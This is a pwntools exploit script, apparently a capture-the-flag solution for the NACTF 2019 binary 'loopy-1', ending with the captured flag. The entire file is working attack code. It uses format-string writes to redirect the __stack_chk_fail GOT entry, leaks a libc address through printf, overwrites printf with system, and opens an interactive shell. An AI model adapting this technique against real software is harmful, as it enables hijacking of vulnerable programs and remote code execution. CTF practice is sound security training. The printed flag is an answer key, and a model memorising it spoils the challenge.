from pwn import *
import sys

context.log_level = "debug"
remote_flag = 0
if len(sys.argv) > 1:
    if sys.argv[1] == 'remote':
        remote_flag = 1
       
if remote_flag:
    p = remote('shell.2019.nactf.com', 31732)
    libc = ELF('./libc.so.6')
else:
    p = process('./loopy-1')
    libc = ELF('/root/software/glibc-all-in-one/libs/2.23-0ubuntu10_i386/libc.so.6')

elf = ELF('./loopy-1')

stack_chk_fail_got = elf.got['__stack_chk_fail']
vuln_addr = elf.symbols['vuln']
# print(hex(stack_chk_fail_got))
p.recvuntil('Type something>')
p.sendline(fmtstr_payload( 7 , {stack_chk_fail_got : vuln_addr }).ljust( 80 , 'a' ))
p.recvuntil('Type something>')
p.sendline((p32(elf.got['printf']) + '%7$s').ljust( 80 , 'a' ))
p.recvuntil('You typed: ')
p.recvn(4)
libc_base = u32(p.recvn(4)) - libc.symbols['printf']
log.success('libc_base : {}'.format(hex(libc_base)))
p.recvuntil('Type something>')
p.sendline(fmtstr_payload( 7 , {elf.got['printf'] : libc_base + libc.symbols['system'] }).ljust( 80 , 'a' ))
p.recvuntil('Type something>')
p.sendline('/bin/sh')
p.interactive()
# nactf{lo0p_4r0und_th3_G0T_VASfJ4VJ} 

